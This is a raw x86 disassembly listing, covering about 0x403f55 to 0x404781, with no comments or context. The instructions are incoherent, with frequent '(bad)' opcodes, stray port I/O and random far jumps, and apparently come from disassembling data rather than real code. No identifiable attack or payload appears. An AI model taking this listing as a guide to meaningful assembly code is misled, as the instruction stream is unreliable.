  403f55:	test   DWORD PTR [edx+0x3f2c3eb6],0xd1ae8730
  403f5f:	and    eax,0x1198dd63
  403f64:	adc    cl,BYTE PTR [ecx-0x2c]
  403f67:	mov    ss,WORD PTR [eax+0xc487292]
  403f6d:	pop    edi
  403f6e:	pop    ds
  403f6f:	or     al,0x2c
  403f71:	fcom   DWORD PTR [ebx+0x7b6bc3bd]
  403f77:	add    al,0x46
  403f79:	inc    ecx
  403f7a:	adc    cl,BYTE PTR [edi-0xf694d8f]
  403f80:	dec    esi
  403f81:	inc    ebp
  403f82:	pushf  
  403f83:	pop    edi
  403f84:	cmp    ch,BYTE PTR [ebx+0x511a2f80]
  403f8a:	or     esi,DWORD PTR [ecx]
  403f8c:	dec    eax
  403f8d:	aam    0xa9
  403f8f:	cmp    al,0x4c
  403f91:	and    dl,BYTE PTR [esi-0x10]
  403f94:	push   edx
  403f95:	sahf   
  403f96:	imul   esp,DWORD PTR [edi],0x40ba8bc4
  403f9c:	shl    ebx,0x57
  403f9f:	push   edi
  403fa0:	mov    edi,0x47fb1572
  403fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa6:	test   BYTE PTR [ebx],dh
  403fa8:	fbstp  TBYTE PTR [eiz*1+0x1ca8eebe]
  403faf:	mov    ds:0xb7c4fde3,al
  403fb4:	jne    0x403f81
  403fb6:	test   BYTE PTR [ebx],al
  403fb8:	popf   
  403fb9:	enter  0x1b4b,0xf9
  403fbd:	ret    
  403fbe:	btr    DWORD PTR [ebx+edx*2+0x7424ca5],edx
  403fc6:	mov    esi,0xd451e26a
  403fcb:	jle    0x403f7c
  403fcd:	push   ebp
  403fce:	and    dh,al
  403fd0:	mov    ebx,0x58b6cd38
  403fd5:	call   0x2d90:0x3fe6df2e
  403fdc:	add    DWORD PTR ds:[edi+0x41621be5],edi
  403fe3:	cmp    cl,0x5
  403fe6:	add    BYTE PTR [edx-0x3c4c2ca8],0x6f
  403fed:	fdiv   QWORD PTR [ebx+eax*4]
  403ff0:	inc    ebx
  403ff1:	leave  
  403ff2:	xor    DWORD PTR [ebp+0x6a55849d],edi
  403ff8:	call   DWORD PTR [ebp-0x6]
  403ffb:	dec    edx
  403ffc:	mov    ebx,0x9bf8d7b1
  404001:	jae    0x404082
  404003:	mov    dl,0xb3
  404005:	(bad)  
  404006:	(bad)  
  404007:	mov    ah,0x8a
  404009:	pop    es
  40400a:	aad    0x8b
  40400c:	sub    BYTE PTR [edi+0x71874148],bl
  404012:	jne    0x40408a
  404014:	xchg   BYTE PTR [edi],ch
  404016:	ins    BYTE PTR es:[edi],dx
  404017:	popfw  
  404019:	repz add eax,edi
  40401c:	inc    ebp
  40401d:	jmp    0x404007
  40401f:	jo     0x403fba
  404021:	xor    ebp,DWORD PTR [edx+0x3e02f028]
  404027:	fnsave [edx-0x7b]
  40402a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40402b:	dec    ebx
  40402c:	push   esi
  40402d:	ins    DWORD PTR es:[edi],dx
  40402e:	repnz pusha 
  404030:	mov    eax,0xfe1ee02f
  404035:	mov    esp,DWORD PTR [ebp-0x760baa81]
  40403b:	push   ecx
  40403c:	mov    BYTE PTR [esp+eax*2],bl
  40403f:	pop    edi
  404040:	mov    ah,0x0
  404042:	bound  ebx,QWORD PTR [ebx]
  404044:	jecxz  0x404092
  404046:	xchg   esi,eax
  404047:	ret    0xce65
  40404a:	leave  
  40404b:	xchg   ecx,eax
  40404c:	pop    edi
  40404d:	and    eax,0xbdf69df7
  404052:	je     0x404004
  404054:	jecxz  0x404092
  404056:	in     al,0x8d
  404058:	stos   BYTE PTR es:[edi],al
  404059:	xchg   edx,eax
  40405a:	ins    BYTE PTR es:[edi],dx
  40405b:	adc    al,ch
  40405d:	xchg   ebx,eax
  40405e:	cmc    
  40405f:	dec    eax
  404060:	out    dx,al
  404061:	aad    0xe5
  404063:	jne    0x404068
  404065:	pop    eax
  404066:	mov    bh,0x1b
  404068:	mov    ah,0xba
  40406a:	dec    ecx
  40406b:	fdivr  QWORD PTR [ebp+eiz*2-0xe]
  40406f:	jnp    0x404029
  404071:	jae    0x40408b
  404073:	adc    BYTE PTR ds:0xd2efb462,dl
  404079:	test   al,0xd2
  40407b:	dec    ecx
  40407c:	(bad)  
  40407d:	call   FWORD PTR [eax]
  40407f:	add    cl,BYTE PTR [bx+si+0x2db0]
  404084:	out    dx,eax
  404085:	or     edx,ebp
  404087:	mov    al,0x75
  404089:	cmp    eax,0xcf3343e7
  40408e:	push   ds
  40408f:	inc    edi
  404090:	mov    esi,0x656b0aa7
  404095:	add    al,0x61
  404097:	in     eax,0x65
  404099:	mov    ah,0xed
  40409b:	xchg   eax,esp
  40409d:	sti    
  40409e:	sub    BYTE PTR [eax+0x54],dh
  4040a1:	push   edi
  4040a2:	push   ecx
  4040a3:	imul   esp,DWORD PTR [edi+0x22],0xffffffc1
  4040a7:	stc    
  4040a8:	dec    esp
  4040a9:	mov    dh,0x5f
  4040ab:	or     BYTE PTR [ebp-0x7b1f3b29],dl
  4040b1:	pop    edi
  4040b2:	mov    cl,0xd1
  4040b4:	aaa    
  4040b5:	cmp    eax,0xb8eaa521
  4040ba:	mov    ds,WORD PTR [ebp-0x12]
  4040bd:	call   0x61c1:0xb767571f
  4040c4:	stc    
  4040c5:	ror    BYTE PTR [eax-0x8],0x91
  4040c9:	inc    esi
  4040ca:	sbb    dl,bl
  4040cc:	call   0x9b761ec9
  4040d1:	cwde   
  4040d2:	inc    BYTE PTR [esi+0x4338723a]
  4040d8:	fucomp st(5)
  4040da:	jg     0x4040f3
  4040dc:	xor    bl,cl
  4040de:	fwait
  4040df:	mov    eax,DWORD PTR [ebp-0x7625f1e1]
  4040e5:	adc    esi,DWORD PTR [ecx-0x68]
  4040e8:	dec    esi
  4040e9:	jp     0x4040b5
  4040eb:	dec    eax
  4040ec:	mov    esi,0x6e441a91
  4040f1:	xsaveopt [esi+0xa]
  4040f5:	stc    
  4040f6:	xchg   esp,eax
  4040f7:	scas   eax,DWORD PTR es:[edi]
  4040f8:	sbb    DWORD PTR ds:[ebx],edx
  4040fb:	cld    
  4040fc:	xchg   BYTE PTR [ebx-0x14],bh
  4040ff:	call   0x2a5e:0xbd1cad3b
  404106:	or     cl,BYTE PTR [edi-0x3b]
  404109:	mov    eax,ds:0xe3b95666
  40410e:	jecxz  0x4040cc
  404110:	push   ecx
  404111:	fisubr WORD PTR [ecx]
  404113:	and    BYTE PTR ds:0x50db505d,bh
  404119:	shl    BYTE PTR [ecx+0xa2c4859],cl
  40411f:	cs test al,0x9a
  404122:	adc    DWORD PTR ds:0x5bbcec,0xffffff9c
  404129:	icebp  
  40412a:	inc    edi
  40412b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40412c:	or     BYTE PTR [edi+eax*8],ah
  40412f:	test   BYTE PTR [edx+0x24dd66ce],ch
  404135:	ret    
  404136:	or     ch,bl
  404138:	dec    BYTE PTR [ebx+ebp*8]
  40413b:	loopne 0x40412e
  40413d:	push   ecx
  40413e:	inc    edx
  40413f:	xor    BYTE PTR [esi-0x6c],dl
  404142:	repz in eax,dx
  404144:	sbb    eax,0xa1568e84
  404149:	sub    BYTE PTR [eax],bl
  40414b:	es cmc 
  40414d:	lods   eax,DWORD PTR ds:[esi]
  40414e:	jmp    0x93b563ad
  404153:	sti    
  404154:	cld    
  404155:	jmp    0x4041c8
  404157:	jecxz  0x40419f
  404159:	test   BYTE PTR [ebp+0x5de36f68],0x3f
  404160:	loop   0x4041d9
  404162:	xor    eax,0xf71ea8cc
  404167:	sbb    ah,ah
  404169:	dec    ecx
  40416a:	shl    BYTE PTR [eax-0x35],0xcb
  40416e:	push   ds
  40416f:	xor    DWORD PTR [eax+0x11],0xffffff82
  404173:	jns    0x40411c
  404175:	in     al,dx
  404176:	test   BYTE PTR [ebx+0x40db5a62],al
  40417c:	imul   ebp,DWORD PTR [ebx],0xfffffffd
  40417f:	xor    DWORD PTR [eax-0x2209a686],ebp
  404185:	sub    DWORD PTR ds:0xa684c892,0x5c7cb92a
  40418f:	add    edi,esp
  404191:	sub    esp,DWORD PTR [edi+0x2ef751f3]
  404197:	mov    eax,ds:0x2e92ec82
  40419c:	rcl    BYTE PTR [ebp-0xe],0x4
  4041a0:	mov    ds:0x5d5a073c,eax
  4041a5:	pop    edx
  4041a6:	mov    eax,0x27b6e54f
  4041ab:	mov    esp,0x30831f26
  4041b0:	adc    DWORD PTR [edx+edi*8+0x3e],eax
  4041b4:	mov    gs,edx
  4041b6:	test   al,0xbc
  4041b8:	and    eax,0xc0508a10
  4041bd:	fidiv  DWORD PTR [eax]
  4041bf:	out    0x18,al
  4041c1:	and    DWORD PTR [ecx+0x7108f139],edx
  4041c7:	popf   
  4041c8:	sbb    al,0xbc
  4041ca:	push   ebp
  4041cb:	fxtract 
  4041cd:	call   0x1c03:0xf2eb4990
  4041d4:	pop    eax
  4041d5:	add    al,BYTE PTR [edx+0x2]
  4041d8:	stos   DWORD PTR es:[edi],eax
  4041d9:	repnz inc esi
  4041db:	test   BYTE PTR [ebp-0x21e4d42e],ch
  4041e1:	push   ebx
  4041e2:	pop    edx
  4041e3:	leave  
  4041e4:	fist   DWORD PTR gs:[esp+eiz*4+0xc893df4]
  4041ec:	push   ds
  4041ed:	(bad)  
  4041f0:	push   esp
  4041f1:	call   0xfc20ffbc
  4041f6:	(bad)  
  4041f7:	adc    al,0x62
  4041f9:	cli    
  4041fa:	mov    eax,ds:0xbb8ec455
  4041ff:	retf   
  404200:	fidiv  WORD PTR [edi-0x6246783e]
  404206:	add    dl,BYTE PTR [edi]
  404208:	sub    al,0x27
  40420a:	ror    BYTE PTR [edi+0x3],cl
  40420d:	or     bl,dl
  40420f:	jmp    0x1b06:0x5ed245c0
  404216:	lahf   
  404217:	test   eax,0x49240f80
  40421c:	push   ebp
  40421d:	loopne 0x40427b
  40421f:	(bad)  
  404220:	adc    BYTE PTR [eax+0x7466e2c8],bh
  404226:	int3   
  404227:	pop    es
  404228:	push   cs
  404229:	js     0x404201
  40422b:	cs stc 
  40422d:	popf   
  40422e:	mov    ds:0x9c6868dc,eax
  404233:	loopne 0x4042a8
  404235:	push   ds
  404236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404237:	xchg   BYTE PTR [edx-0x34],bl
  40423a:	out    0x74,al
  40423c:	mov    al,0x61
  40423e:	cdq    
  40423f:	and    al,0x83
  404242:	js     0x4041cb
  404244:	imul   esp,DWORD PTR [ebx+ecx*2],0xa715874b
  40424b:	and    edx,esi
  40424d:	aaa    
  40424e:	push   ebp
  40424f:	and    al,0x5f
  404251:	sahf   
  404252:	jne    0x404210
  404254:	popf   
  404255:	push   ss
  404256:	sub    BYTE PTR [ebp+0x4e],bl
  404259:	and    eax,0x43ce9c9f
  40425e:	jae    0x4042b2
  404260:	test   eax,0x9a278557
  404265:	rcr    DWORD PTR [esi+0x2c],cl
  404268:	in     eax,dx
  404269:	mov    esi,0xef5df3b6
  40426e:	add    bl,BYTE PTR [edi-0x3beb14b8]
  404274:	test   al,0x59
  404276:	inc    eax
  404277:	imul   edx,DWORD PTR [ebp-0x71],0xffffffda
  40427b:	enter  0xb7ea,0x5f
  40427f:	or     eax,DWORD PTR [edx+0x6b]
  404282:	mov    eax,edi
  404284:	and    al,0x11
  404286:	push   edi
  404287:	pop    esp
  404288:	sar    BYTE PTR [esi-0x59],0x7f
  40428c:	sub    ah,BYTE PTR ds:[esi-0x2461a236]
  404293:	es push edi
  404295:	adc    bl,bh
  404297:	sbb    edx,DWORD PTR [ebp+0x7f]
  40429a:	inc    ebx
  40429b:	adc    edx,esi
  40429d:	dec    ebp
  40429e:	mov    ds:0xcd43af69,al
  4042a3:	sub    esp,DWORD PTR [esi+0x35]
  4042a6:	(bad)  
  4042a7:	rcr    edx,cl
  4042a9:	mov    ah,0x99
  4042ab:	int3   
  4042ac:	fnsave [edx-0x5b27b841]
  4042b2:	push   ds
  4042b3:	mov    al,ds:0x9a3fa2e2
  4042b8:	and    esp,DWORD PTR cs:[ecx-0x71]
  4042bc:	(bad)  
  4042bd:	xchg   ebx,eax
  4042be:	xchg   esi,eax
  4042bf:	push   ebx
  4042c0:	jns    0x40424a
  4042c2:	xchg   esi,eax
  4042c3:	dec    ecx
  4042c4:	mov    ebx,ecx
  4042c6:	inc    eax
  4042c7:	xchg   edi,eax
  4042c8:	xor    eax,0x5b129824
  4042cd:	nop
  4042ce:	push   eax
  4042d0:	iret   
  4042d1:	test   BYTE PTR [ebx+0x6d],dl
  4042d4:	mul    DWORD PTR [ebx+0x6cd5cf94]
  4042da:	sub    esp,edx
  4042dc:	add    cl,BYTE PTR [ebx-0x7f]
  4042df:	daa    
  4042e0:	xchg   esp,eax
  4042e1:	jp     0x40428c
  4042e3:	(bad)  
  4042e4:	loopne 0x404298
  4042e6:	jp     0x40431b
  4042e8:	pusha  
  4042e9:	jle    0x4042ac
  4042eb:	cmp    esp,edx
  4042ed:	fwait
  4042ee:	push   eax
  4042ef:	scas   al,BYTE PTR es:[edi]
  4042f0:	jle    0x404348
  4042f2:	inc    esi
  4042f3:	nop
  4042f4:	and    al,0xcf
  4042f6:	(bad)  
  4042f8:	mov    ecx,0xf9b37673
  4042fd:	sbb    al,0xda
  4042ff:	xchg   esi,eax
  404300:	add    DWORD PTR [esi-0x473ddcc7],edx
  404306:	(bad)  
  404307:	or     dh,BYTE PTR [ebx]
  404309:	inc    edx
  40430a:	sbb    DWORD PTR [edx],ebp
  40430c:	sub    DWORD PTR [esi-0x7efc4fc8],eax
  404312:	push   esp
  404313:	loope  0x40435c
  404315:	lock adc al,BYTE PTR [ecx+0x3568195c]
  40431c:	mov    BYTE PTR [eax-0x1347c5a9],dl
  404322:	dec    esp
  404323:	loop   0x404317
  404325:	and    edi,esi
  404327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404328:	mov    fs,WORD PTR [ebx]
  40432a:	mov    edi,0xcf7acc15
  40432f:	loope  0x4042de
  404331:	outs   dx,DWORD PTR ds:[esi]
  404332:	ins    BYTE PTR es:[edi],dx
  404333:	scas   al,BYTE PTR es:[edi]
  404334:	les    ecx,FWORD PTR ds:0xa01d89a3
  40433a:	stc    
  40433b:	push   ecx
  40433c:	loope  0x404352
  40433e:	mov    edi,0xbbb7786
  404343:	lds    esp,FWORD PTR [ebx+0x31]
  404346:	jne    0x404304
  404348:	fst    DWORD PTR [edx]
  40434a:	pusha  
  40434b:	add    esi,DWORD PTR [esi]
  40434d:	adc    DWORD PTR [edi+edi*2+0x7b],esp
  404351:	call   0x3328:0x70bc19ca
  404358:	daa    
  404359:	mov    edi,0xe6ff895a
  40435e:	sahf   
  40435f:	aam    0xb8
  404361:	cs into 
  404363:	test   eax,0xf3648d32
  404368:	imul   ebp,DWORD PTR [esi+0x7fbc90c7],0xffffff9f
  40436f:	xor    BYTE PTR [esi-0x2476264],0x8b
  404376:	push   ecx
  404377:	leave  
  404378:	jmp    0x297cbab7
  40437d:	(bad)  
  40437e:	repz push cs
  404380:	add    eax,ebp
  404382:	mov    al,BYTE PTR [edi*4+0x66c78312]
  404389:	enter  0xecaf,0x0
  40438d:	dec    edi
  40438e:	(bad)  
  40438f:	loop   0x4043f2
  404391:	xor    dh,ch
  404393:	adc    bh,BYTE PTR [ebp-0x3430762f]
  404399:	neg    DWORD PTR [eax-0x11]
  40439c:	inc    eax
  40439d:	push   0xf0b9ab77
  4043a2:	inc    ebx
  4043a3:	ret    
  4043a4:	mov    BYTE PTR [esp+ebp*1],bl
  4043a7:	xchg   edx,eax
  4043a8:	int3   
  4043a9:	and    BYTE PTR [ecx+0xc8fa110],0xa5
  4043b0:	jecxz  0x404428
  4043b2:	(bad)  
  4043b3:	xor    DWORD PTR [esi-0x56],ebx
  4043b6:	push   ds
  4043b7:	adc    eax,0x8c559d98
  4043bc:	push   eax
  4043bd:	daa    
  4043be:	dec    edi
  4043bf:	jp     0x4043da
  4043c1:	push   edi
  4043c2:	adc    BYTE PTR [ecx-0x60db6f9f],cl
  4043c8:	adc    DWORD PTR [edi+0x3ef52b51],edx
  4043ce:	aaa    
  4043cf:	pop    ebp
  4043d0:	push   ss
  4043d1:	test   DWORD PTR [ecx+edi*4+0x5215f8a6],esp
  4043d8:	and    al,BYTE PTR ds:0x9fd5e991
  4043de:	mov    ch,0x9
  4043e0:	pop    eax
  4043e1:	xor    BYTE PTR [edi+0x2ec2b6e3],0xb
  4043e8:	ja     0x4043ff
  4043ea:	xchg   DWORD PTR [edi],edi
  4043ec:	xor    BYTE PTR [ecx],bl
  4043ee:	pop    es
  4043ef:	test   eax,0x63716679
  4043f4:	sub    BYTE PTR [esi],ch
  4043f6:	xor    eax,esp
  4043f8:	test   DWORD PTR [edi-0x57abdcc0],esp
  4043fe:	loop   0x4043f9
  404400:	rol    BYTE PTR [eax+0x32],cl
  404403:	enter  0xd37d,0xc5
  404407:	stc    
  404408:	or     eax,0xe83288a4
  40440d:	scas   al,BYTE PTR es:[edi]
  40440e:	frstor [ebx-0x7e8aaa0]
  404414:	mov    ch,0x65
  404416:	mov    ecx,0x2fb7e65a
  40441b:	push   ebp
  40441c:	adc    ecx,DWORD PTR [esi+0x8e58304]
  404422:	pop    es
  404423:	das    
  404424:	adc    BYTE PTR ds:0x4842c5d2,ah
  40442a:	xchg   ebp,eax
  40442b:	and    al,0xc1
  40442d:	inc    edx
  40442e:	xchg   DWORD PTR ds:0xd1715bc8,ebp
  404434:	addr16 mov dl,0x4c
  404437:	sbb    eax,0xf2789be1
  40443d:	adc    al,0xae
  40443f:	sub    BYTE PTR [edi+0x5fdf3be5],ah
  404445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404446:	mov    bl,0x55
  404448:	pusha  
  404449:	cmp    ebx,DWORD PTR [eax]
  40444b:	mov    ch,0x14
  40444d:	mov    esp,0x6eec8e92
  404452:	daa    
  404453:	rcl    DWORD PTR [ecx-0x6b5f72f9],1
  404459:	das    
  40445a:	push   cs
  40445b:	and    edx,0x65
  40445e:	nop
  40445f:	sbb    eax,0x8e572f5a
  404464:	cmp    BYTE PTR [ecx+0x76cf1732],cl
  40446a:	jno    0x4044eb
  40446c:	dec    ecx
  40446d:	shl    ecx,0xd8
  404470:	sbb    esi,edx
  404472:	push   ecx
  404473:	aad    0xd
  404475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404476:	xor    al,BYTE PTR [edx]
  404478:	adc    al,cl
  40447a:	or     eax,0xd52b320a
  40447f:	sub    al,0xee
  404481:	or     al,0xa7
  404483:	ja     0x40446e
  404485:	or     edx,edx
  404487:	and    al,0x52
  404489:	out    0x2,al
  40448b:	jb     0x40446e
  40448d:	fwait
  40448e:	inc    ebx
  40448f:	dec    esp
  404490:	sub    esp,DWORD PTR [ebx+0x1]
  404493:	out    dx,eax
  404494:	lds    eax,FWORD PTR [esp+ebp*8]
  404497:	jne    0x40442e
  404499:	xchg   ebx,eax
  40449a:	ss out dx,eax
  40449c:	dec    esi
  40449d:	sbb    al,0x43
  40449f:	jns    0x40448d
  4044a1:	push   ss
  4044a2:	and    eax,0xf8e5e184
  4044a7:	mov    al,0xbb
  4044a9:	outs   dx,BYTE PTR fs:[esi]
  4044ab:	ds clc 
  4044ad:	enter  0xca14,0x6a
  4044b1:	mov    ebp,0x607c878e
  4044b6:	daa    
  4044b7:	shl    BYTE PTR [esi],1
  4044b9:	pusha  
  4044ba:	cmp    eax,0xb26ebf10
  4044bf:	xor    al,0x40
  4044c1:	enter  0x6fd8,0x9f
  4044c5:	pop    ss
  4044c6:	cs jg  0x404502
  4044c9:	ficomp DWORD PTR [ebx]
  4044cb:	mov    ds:0x762db369,eax
  4044d0:	jne    0x404465
  4044d2:	pop    ss
  4044d3:	fld    st(6)
  4044d5:	jns    0x4044ec
  4044d7:	les    ebx,FWORD PTR [ebp-0x21]
  4044da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044db:	imul   ebx,DWORD PTR [edx],0x51dc30be
  4044e1:	out    0xa1,al
  4044e3:	js     0x404564
  4044e5:	fild   QWORD PTR [ebx+0x18]
  4044e8:	dec    eax
  4044e9:	push   es
  4044ea:	ret    
  4044eb:	cmp    ebp,DWORD PTR [edx+eiz*4-0x391efd0e]
  4044f2:	or     BYTE PTR [ebp+0x11],cl
  4044f5:	push   edx
  4044f6:	fisttp QWORD PTR [edi]
  4044f8:	push   0xf5ef6c49
  4044fd:	ins    DWORD PTR es:[edi],dx
  4044fe:	mov    edx,0xf7218200
  404503:	xor    dh,BYTE PTR [esi-0x6]
  404506:	clc    
  404507:	mov    cl,0x3d
  404509:	add    DWORD PTR [esi],ebp
  40450b:	mov    al,ds:0x5536880
  404510:	push   es
  404511:	bound  ebx,QWORD PTR [ecx-0x4c0a6a5b]
  404517:	ins    BYTE PTR es:[edi],dx
  404518:	and    BYTE PTR [ecx-0x105f6668],0xd
  40451f:	jmp    0xd7dc:0x7935ecc8
  404526:	sbb    edx,ebp
  404528:	arpl   ax,ax
  40452a:	jp     0x404527
  40452c:	push   es
  40452d:	jmp    0x4044b2
  40452f:	test   al,0x84
  404531:	popf   
  404532:	push   ebx
  404533:	lods   al,BYTE PTR ds:[esi]
  404534:	mov    ebp,0x42fcfaf3
  404539:	adc    al,0x62
  40453b:	ror    BYTE PTR [ecx+eax*1-0x230401e7],1
  404542:	mov    ebp,0xfcaa3a10
  404547:	mov    dh,0x44
  404549:	jle    0x404593
  40454b:	int3   
  40454c:	jnp    0x4044ef
  40454e:	(bad)  
  404550:	jge    0x4045af
  404552:	arpl   WORD PTR [edx+eax*4],ax
  404555:	and    ah,0xf2
  404558:	cwde   
  404559:	ins    BYTE PTR es:[edi],dx
  40455a:	ficom  DWORD PTR [ebx]
  40455c:	test   eax,0x5d3fe0d0
  404561:	or     DWORD PTR [eax],ebp
  404563:	jae    0x4045d6
  404565:	cli    
  404566:	mov    al,ds:0x1b8f9235
  40456b:	mov    BYTE PTR [esi-0x30],0x1e
  40456f:	mov    eax,ds:0x1bbf4a2d
  404574:	jmp    0x4045e0
  404576:	adc    cl,dh
  404578:	mov    ah,0x6c
  40457a:	dec    ebx
  40457b:	sub    eax,0x130e1019
  404580:	call   0x32cb196b
  404585:	xchg   edi,eax
  404586:	call   FWORD PTR [eax+0x709c6dea]
  40458c:	fisttp DWORD PTR [ebx-0x6e153e70]
  404592:	add    DWORD PTR [eax],edi
  404594:	jb     0x4045fb
  404596:	jne    0x40456f
  404598:	sub    eax,0xa26ae551
  40459d:	es pop edx
  40459f:	into   
  4045a0:	jb     0x4045ff
  4045a2:	mov    esi,0x884232ad
  4045a7:	pop    esi
  4045a8:	xlat   BYTE PTR ds:[ebx]
  4045a9:	add    DWORD PTR [eax],ebx
  4045ab:	add    eax,0x8ec2f985
  4045b0:	mov    edx,DWORD PTR [edx]
  4045b2:	jmp    0x8f3e:0xea9ae431
  4045b9:	mov    BYTE PTR [ecx-0x3b4c6bb8],bh
  4045bf:	fld    QWORD PTR [ecx+0x6c1ee294]
  4045c5:	push   ebx
  4045c6:	sbb    BYTE PTR [eax+0x4667d73],al
  4045cc:	xchg   esp,eax
  4045cd:	int3   
  4045ce:	xlat   BYTE PTR ds:[ebx]
  4045cf:	mov    dl,0xd
  4045d1:	jl     0x4045f0
  4045d3:	jecxz  0x404647
  4045d5:	dec    ecx
  4045d6:	div    BYTE PTR [edi+0x394e010f]
  4045dc:	in     al,0xef
  4045de:	and    al,cl
  4045e0:	adc    al,0x5f
  4045e2:	repnz into 
  4045e4:	sti    
  4045e5:	ficom  DWORD PTR [edx+ecx*4-0x60495795]
  4045ec:	test   al,0x49
  4045ee:	inc    edx
  4045ef:	fucomip st,st(3)
  4045f1:	scas   al,BYTE PTR es:[edi]
  4045f2:	jecxz  0x40466f
  4045f4:	mov    edx,0xb5b693f4
  4045f9:	adc    cl,BYTE PTR [edx+0x7ac4774f]
  4045ff:	inc    ebp
  404600:	fucom  st(7)
  404602:	shr    BYTE PTR [edx-0x2cd6e8ce],1
  404608:	sbb    BYTE PTR [esi-0x3eff93d7],cl
  40460e:	(bad)  
  40460f:	sar    BYTE PTR [edi+0x3f23f5c7],1
  404615:	popa   
  404616:	fiadd  WORD PTR [esi]
  404618:	inc    eax
  404619:	(bad)  
  40461a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40461b:	sbb    BYTE PTR [edx],ah
  40461d:	push   esp
  40461e:	jg     0x40462e
  404620:	xchg   edx,eax
  404621:	lds    ecx,FWORD PTR [edi]
  404623:	das    
  404624:	xlat   BYTE PTR ds:[ebx]
  404625:	jg     0x4045fb
  404627:	mov    ecx,0x208f45cb
  40462c:	loope  0x4045ff
  40462e:	ror    BYTE PTR [ecx],0x8f
  404631:	xchg   edi,eax
  404632:	xchg   ecx,eax
  404633:	or     al,BYTE PTR [edx+0x66]
  404636:	jmp    0xb993:0xf10e1381
  40463d:	dec    ebp
  40463e:	in     eax,0x54
  404640:	and    eax,0x160f5d53
  404645:	mov    eax,ds:0x5a90dfc8
  40464a:	(bad)  
  40464b:	ss mov ecx,edx
  40464e:	aad    0x58
  404650:	retf   0xaac5
  404653:	jae    0x404673
  404655:	shl    DWORD PTR [eax+eiz*2],0x3
  404659:	push   ebx
  40465a:	sbb    bh,BYTE PTR [ecx]
  40465c:	shl    bh,cl
  40465e:	repnz lock xchg ecx,eax
  404661:	addr16 pusha 
  404663:	sub    esi,ebp
  404665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404666:	sbb    esi,DWORD PTR [eax]
  404668:	cdq    
  404669:	outs   dx,DWORD PTR ds:[esi]
  40466a:	mov    edx,0xe6cd0aae
  40466f:	adc    al,0xb4
  404671:	call   0x53e3179
  404676:	mov    ch,0x36
  404678:	dec    eax
  404679:	mov    ah,0xcb
  40467b:	mov    ?,WORD PTR [ebx+0x3e]
  40467e:	pop    esp
  40467f:	push   0xdceff7c5
  404684:	ins    BYTE PTR es:[edi],dx
  404685:	rcr    esp,0xfb
  404688:	lea    esi,[eax+0x10200b3c]
  40468e:	xchg   eax,esi
  404690:	fild   DWORD PTR [ebx+esi*1]
  404693:	rol    DWORD PTR [ebx-0x42a77411],1
  404699:	cs cs out dx,al
  40469c:	not    cl
  40469e:	int    0x9d
  4046a0:	popf   
  4046a1:	sar    esp,1
  4046a3:	jecxz  0x40470a
  4046a5:	pandn  mm2,QWORD PTR [edx+0xb]
  4046a9:	sub    eax,0x5bcd3e2c
  4046ae:	mov    ds,WORD PTR [ecx-0x37688be]
  4046b4:	mov    BYTE PTR [esi+esi*2+0x4c],dh
  4046b8:	adc    al,0x57
  4046ba:	pop    ebx
  4046bb:	cmp    DWORD PTR [esi-0x15],ecx
  4046be:	cdq    
  4046bf:	add    al,0x5d
  4046c1:	into   
  4046c2:	jecxz  0x40473d
  4046c4:	pusha  
  4046c5:	dec    edx
  4046c6:	push   ebp
  4046c7:	or     al,0xd4
  4046c9:	imul   eax,DWORD PTR [ebp+0x10],0xffffffb5
  4046cd:	push   ebp
  4046ce:	mov    esi,0x8bfbff06
  4046d3:	adc    eax,DWORD PTR [ebx+0x55951279]
  4046d9:	sbb    bl,BYTE PTR [eax]
  4046db:	xchg   ecx,eax
  4046dc:	inc    esp
  4046dd:	pop    ebp
  4046de:	add    eax,ecx
  4046e0:	add    BYTE PTR ds:[esp+eax*2],bl
  4046e4:	std    
  4046e5:	xchg   ecx,eax
  4046e6:	pop    esp
  4046e7:	and    al,0x55
  4046e9:	pop    ecx
  4046ea:	mov    bh,0xca
  4046ec:	cs cmp ch,cl
  4046ef:	or     ebp,DWORD PTR gs:0xb775359a
  4046f6:	and    bl,BYTE PTR [ecx+0x6d970d6e]
  4046fc:	loope  0x4046a3
  4046fe:	jns    0x4046ab
  404700:	sub    eax,0xfcdf6a4f
  404705:	call   DWORD PTR [eax+0x629960cf]
  40470b:	add    eax,0x68a7acba
  404710:	xchg   ecx,eax
  404711:	cmp    BYTE PTR [edi],ch
  404713:	mov    ds:0xc87adf53,eax
  404718:	inc    esi
  404719:	jmp    0x9bdf:0x2830da06
  404720:	pop    edx
  404721:	mov    dl,0x21
  404723:	and    BYTE PTR [ebx],0xe5
  404726:	cld    
  404727:	xor    al,bl
  404729:	rcl    DWORD PTR [eax-0x318ee837],cl
  40472f:	retf   
  404730:	ins    DWORD PTR es:[edi],dx
  404731:	and    eax,0xea35b389
  404736:	pop    eax
  404737:	lahf   
  404738:	mov    dl,0x99
  40473a:	scas   al,BYTE PTR es:[edi]
  40473b:	push   cs
  40473c:	and    DWORD PTR [ebp-0x28],0xf6d64ea
  404743:	add    al,0xd2
  404745:	and    eax,0xa6c44695
  40474a:	dec    edi
  40474b:	sbb    DWORD PTR [bp+di-0x6ca5],esp
  404750:	leave  
  404751:	cmp    al,0x2d
  404753:	fadd   st(3),st
  404755:	loopne 0x4047d6
  404757:	shl    BYTE PTR fs:[ebx-0x279ed30],1
  40475e:	mov    BYTE PTR [esi+0x12],cl
  404761:	inc    ebp
  404762:	push   ds
  404763:	jmp    0x404790
  404765:	push   0x31
  404767:	ins    BYTE PTR es:[edi],dx
  404768:	jnp    0x404727
  40476a:	sti    
  40476b:	dec    esi
  40476c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40476d:	fwait
  40476e:	sbb    ebp,edi
  404770:	push   ebp
  404771:	stos   DWORD PTR es:[edi],eax
  404772:	mov    ecx,0x59289177
  404777:	mov    dl,0xad
  404779:	push   ebp
  40477a:	mov    dh,0x14
  40477c:	jo     0x4047de
  40477e:	fwait
  40477f:	clc    
  404780:	scas   al,BYTE PTR es:[edi]
  404781:	mov    ecx,0x9a9920e5
